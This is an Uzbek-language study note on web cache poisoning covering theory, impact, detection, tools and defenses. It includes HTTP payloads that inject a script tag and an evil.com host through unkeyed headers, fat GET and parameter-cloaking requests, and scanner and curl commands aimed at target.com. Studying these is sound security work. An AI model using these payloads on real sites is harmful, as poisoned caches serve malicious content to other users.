# Web Cache Poisoning

> Lab yechimlari (PortSwigger'ning 13 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Cache (CDN/proxy) bir xil javobni qayta-qayta bermaslik uchun uni **saqlaydi** va keyingi
foydalanuvchilarga o'shani qaytaradi. Cache javobni **cache key** (odatda URL+Host) bo'yicha
ajratadi. Muammo: ko'p **header/parametr** javobga ta'sir qiladi, lekin cache key'ga **kirmaydi**
(unkeyed). Sen unkeyed input bilan javobni **zararli** qilasan — key o'zgarmaydi — cache uni
saqlaydi va **har bir** keyingi foydalanuvchiga beradi.

**Ildiz sabab:** cache va origin server "javobga nima ta'sir qiladi" degan savolга turlicha javob
beradi — cache kam narsani key qiladi, origin ko'proq inputga ishonadi. Shu nomuvofiqlik =
unkeyed input orqali poisoning.

## Turlari
- **Unkeyed header** (`X-Forwarded-Host`, `X-Host`) → JS import/redirect URL'ni buzish.
- **Unkeyed cookie** → javobga reflect bo'lgan cookie orqali XSS.
- **Unkeyed query string / parameter** (`utm_content`) → payloadni cache'ga saqlash.
- **Cache key normalization** farqi → URL normalize farqidan foydalanish.
- **Fat GET / parameter cloaking / cache key injection** — parsing nomuvofiqligi.
- **Internal cache poisoning** — ikki qatlamli cache orasidagi farq.

## Oqibatlar (IMPACT)
- **Reflected XSS'ni persistent qilib hammaga tarqatish** (bitta so'rovdan → minglab qurbon).
- Ixtiyoriy redirect, saytni buzish (defacement), DoS.
- Maxfiy javobni keshlatib boshqalarga leak.
> Ommaviy ta'sir bo'lgani uchun odatda **High** (XSS cache'ga tushsa).

## Asos: keyed vs unkeyed
Cache javobni URL+Host bo'yicha aniqlaydi (key). Ko'p header esa javobga ta'sir qiladi,
lekin key'ga kirmaydi (unkeyed). Sen unkeyed input bilan javobni buzasan — key o'zgarmaydi
— cache saqlab, hammaga beradi.

## Aniqlash
```http
GET /?cb=12345 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
```
> Javobda `evil.com` aks etdimi? Keshlandimi? Javob header'ga qara:
```
X-Cache: hit        Age: 60        CF-Cache-Status: HIT
```
> Har safar `?cb=random` (cache-buster) ishlat — boshqa userга zarar bermaslik uchun o'z key'ingда test qil.

## Exploit
```http
# X-Forwarded-Host → XSS/redirect
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: a."><script>alert(1)</script>
```
```http
# Fat GET (body keyga kirmaydi)
GET /?x=1 HTTP/1.1
Content-Length: 10

x=evil
```
```
# Param cloaking
GET /?param=foo&utm_content=bar;param=evil
```

## TOOLLAR

### Burp Param Miner — podshosi (James Kettle)
```
Burp extension → o'ng tugma → "Guess headers" / "Guess GET parameters"
```
> Unkeyed header va parametrlarni avtomat topadi — cache poisoning uchun aynan shu kerak.

### web-cache-vulnerability-scanner (wcvs) — avtomat skaner
```bash
wcvs scan -u https://target.com
```
> Ko'p cache poisoning texnikasini (header, param cloaking) avtomat sinab chiqadi.

### nuclei — ma'lum cache poisoning shablon
```bash
nuclei -u https://target.com -t ~/nuclei-templates/http/misconfiguration/ -tags cache
```
> Ma'lum unkeyed header teshiklarini tayyor shablon bilan tekshiradi.

### curl — qo'lda HIT/MISS kuzatish
```bash
curl -sI "https://target.com/?cb=1" -H "X-Forwarded-Host: evil.com" | grep -iE "x-cache|age|x-forwarded"
```
> Payload aks etib keshlanganini (HIT) qo'lda tasdiqlaysan.

## Ehtiyot
Real path'ni poison qilsang boshqalarga uriladi. PoC uchun zararsiz payload (`alert`),
o'z brauzeringда ko'rsat, DoS urma.

## Himoya
Unkeyed input'ga javobni bog'lama, kerakli header'larni key'ga qo'sh, xavfli header'ni
(`X-Forwarded-Host`) qabul qilma, sensitive javobni `no-store` bilan keshlama.
